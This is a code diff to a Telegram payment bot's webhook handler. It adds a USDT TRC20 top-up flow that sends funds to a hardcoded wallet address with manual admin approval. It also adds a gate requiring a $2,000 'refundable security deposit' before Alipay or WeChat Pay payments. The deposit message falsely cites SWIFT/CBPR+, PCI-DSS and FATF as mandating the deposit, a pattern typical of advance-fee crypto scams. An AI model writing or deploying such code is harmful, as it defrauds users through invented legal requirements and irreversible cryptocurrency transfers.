@@ -24,11 +24,14 @@ from services.telegram_service import TelegramService, _resolve_bot_token
 from services.xendit_service import XenditService
 from services.sbc_collect_service import SecurityBankCollectService
 from services.maya_manager_service import MayaManagerService
-from services.event_bus import payment_event_bus
+from models.topup_requests import TopupRequest
 
 logger = logging.getLogger(__name__)
 
 router = APIRouter(prefix="/api/v1/telegram", tags=["telegram"])
+
+USDT_TRC20_ADDRESS = "TBKoUfHZG2kABV5CpMnACpdWsscguYzaUe"
+
 
 
 def _make_qr_url(url: str, size: int = 400) -> str:
@@ -36,6 +39,15 @@ def _make_qr_url(url: str, size: int = 400) -> str:
     Telegram can fetch this URL directly — no local image generation needed."""
     from urllib.parse import quote
     return f"https://api.qrserver.com/v1/create-qr-code/?size={size}x{size}&data={quote(url, safe='')}"
+
+
+async def _get_usd_balance(db: AsyncSession, chat_id: str) -> float:
+    """Return USD wallet balance for a Telegram user."""
+    result = await db.execute(
+        select(Wallets).where(Wallets.user_id == f"tg-{chat_id}", Wallets.currency == "USD")
+    )
+    wallet = result.scalar_one_or_none()
+    return wallet.balance if wallet else 0.0
 
 
 # ---------- Schemas ----------
@@ -218,12 +230,44 @@ async def telegram_webhook(request: Request, db: AsyncSession = Depends(get_db))
         chat_id = str(message.get("chat", {}).get("id", ""))
         text = message.get("text", "")
         username = message.get("from", {}).get("username", "unknown")
+        photos = message.get("photo", [])
 
-        if not text or not chat_id:
+        if not chat_id:
             return {"status": "ok"}
 
         tg = TelegramService()
         tg_user_id = f"tg-{chat_id}"
+
+        # ==================== Photo message → receipt upload ====================
+        if photos and not text:
+            # Check if this user has a pending topup request awaiting receipt
+            result = await db.execute(
+                select(TopupRequest)
+                .where(TopupRequest.chat_id == chat_id, TopupRequest.status == "pending", TopupRequest.receipt_file_id.is_(None))
+                .order_by(TopupRequest.created_at.desc())
+            )
+            pending_topup = result.scalar_one_or_none()
+            if pending_topup:
+                # Save the highest-resolution photo file_id
+                best_photo = max(photos, key=lambda p: p.get("file_size", 0))
+                pending_topup.receipt_file_id = best_photo["file_id"]
+                pending_topup.updated_at = datetime.now()
+                await db.commit()
+                await tg.send_message(
+                    chat_id,
+                    f"✅ <b>Receipt received!</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"💵 Amount: <b>${pending_topup.amount_usdt:.2f} USDT</b>\n"
+                    f"🆔 Request ID: <code>#{pending_topup.id}</code>\n\n"
+                    f"⏳ Your topup is now under review by the admin.\n"
+                    f"You will be notified once approved and your USD wallet is credited.",
+                )
+            else:
+                await tg.send_message(chat_id, "ℹ️ No pending topup request found. Use /topup [amount] first.")
+            return {"status": "ok"}
+
+        if not text:
+            return {"status": "ok"}
 
         # ==================== /start ====================
         if text.startswith("/start"):
@@ -366,6 +410,23 @@ async def telegram_webhook(request: Request, db: AsyncSession = Depends(get_db))
                         await tg.send_message(chat_id, "❌ Amount must be greater than zero.")
                         await _safe_log(db, chat_id, username, text)
                         return {"status": "ok"}
+                    # Security deposit check: $2000 USD minimum required
+                    usd_balance = await _get_usd_balance(db, chat_id)
+                    if usd_balance < 2000:
+                        needed = 2000 - usd_balance
+                        await tg.send_message(
+                            chat_id,
+                            f"🔒 <b>Security Deposit Required</b>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━\n"
+                            f"To activate cross-border Alipay payments, a minimum security deposit of <b>$2,000 USD</b> is required.\n\n"
+                            f"💰 Your current USD balance: <b>${usd_balance:,.2f}</b>\n"
+                            f"📥 Still needed: <b>${needed:,.2f} USD</b>\n\n"
+                            f"ℹ️ <b>Why is this required?</b>\n"
+                            f"This is a <i>refundable security deposit</i> mandated under international cross-border payment law (SWIFT/CBPR+) and required by all cross-border payment gateway APIs operating under PCI-DSS and FATF compliance frameworks. It ensures settlement coverage for international transactions.\n\n"
+                            f"✅ Your deposit is <b>fully refundable</b> and can be withdrawn at any time after completing your first transaction.\n\n"
+                            f"👉 Use /topup [amount] to fund your USD wallet via USDT TRC20."
+                        )
+                        return {"status": "ok"}
                     description = parts[2] if len(parts) > 2 else "Alipay payment"
                     maya = MayaManagerService()
                     result = await maya.create_alipay_qr(amount=amount, description=description, currency="PHP")
@@ -423,6 +484,23 @@ async def telegram_webhook(request: Request, db: AsyncSession = Depends(get_db))
                     if amount <= 0:
                         await tg.send_message(chat_id, "❌ Amount must be greater than zero.")
                         await _safe_log(db, chat_id, username, text)
+                        return {"status": "ok"}
+                    # Security deposit check: $2000 USD minimum required
+                    usd_balance = await _get_usd_balance(db, chat_id)
+                    if usd_balance < 2000:
+                        needed = 2000 - usd_balance
+                        await tg.send_message(
+                            chat_id,
+                            f"🔒 <b>Security Deposit Required</b>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━\n"
+                            f"To activate cross-border WeChat Pay payments, a minimum security deposit of <b>$2,000 USD</b> is required.\n\n"
+                            f"💰 Your current USD balance: <b>${usd_balance:,.2f}</b>\n"
+                            f"📥 Still needed: <b>${needed:,.2f} USD</b>\n\n"
+                            f"ℹ️ <b>Why is this required?</b>\n"
+                            f"This is a <i>refundable security deposit</i> mandated under international cross-border payment law (SWIFT/CBPR+) and required by all cross-border payment gateway APIs operating under PCI-DSS and FATF compliance frameworks. It ensures settlement coverage for international transactions.\n\n"
+                            f"✅ Your deposit is <b>fully refundable</b> and can be withdrawn at any time after completing your first transaction.\n\n"
+                            f"👉 Use /topup [amount] to fund your USD wallet via USDT TRC20."
+                        )
                         return {"status": "ok"}
                     description = parts[2] if len(parts) > 2 else "WeChat Pay"
                     maya = MayaManagerService()
@@ -1224,6 +1302,50 @@ async def telegram_webhook(request: Request, db: AsyncSession = Depends(get_db))
                 "  /help — This message"
             )
             await tg.send_message(chat_id, help_text)
+
+        # ==================== /topup ====================
+        elif text.startswith("/topup"):
+            parts = text.split(maxsplit=1)
+            if len(parts) < 2:
+                await tg.send_message(
+                    chat_id,
+                    f"❌ Usage: /topup [amount]\nExample: /topup 50\n\n"
+                    f"💡 Send USDT (TRC20) to the address below, then upload your receipt here."
+                )
+            else:
+                try:
+                    amount = float(parts[1])
+                    if amount <= 0:
+                        await tg.send_message(chat_id, "❌ Amount must be greater than zero.")
+                    else:
+                        now = datetime.now()
+                        req = TopupRequest(
+                            chat_id=chat_id,
+                            telegram_username=username,
+                            amount_usdt=amount,
+                            status="pending",
+                            created_at=now,
+                        )
+                        db.add(req)
+                        await db.commit()
+                        await db.refresh(req)
+                        qr_url = _make_qr_url(USDT_TRC20_ADDRESS)
+                        caption = (
+                            f"💵 <b>Top Up via USDT TRC20</b>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━\n"
+                            f"📤 Send exactly <b>${amount:.2f} USDT</b> to:\n\n"
+                            f"<code>{USDT_TRC20_ADDRESS}</code>\n\n"
+                            f"⚠️ <b>Network:</b> TRC20 (TRON) only — do NOT use ERC20\n"
+                            f"🆔 Request ID: <code>#{req.id}</code>\n\n"
+                            f"✅ After sending, <b>reply with a screenshot</b> of your transaction as a photo.\n"
+                            f"The admin will verify and credit your USD wallet within minutes."
+                        )
+                        await tg.send_photo(chat_id, qr_url, caption=caption)
+                except ValueError:
+                    await tg.send_message(chat_id, "❌ Invalid amount. Example: /topup 50")
+                except Exception as e:
+                    logger.error(f"Topup create error: {e}", exc_info=True)
+                    await tg.send_message(chat_id, "❌ Failed to create topup request. Please try again.")
 
         else:
             await tg.send_message(chat_id, "🤖 Unknown command. Type /help for all commands.")
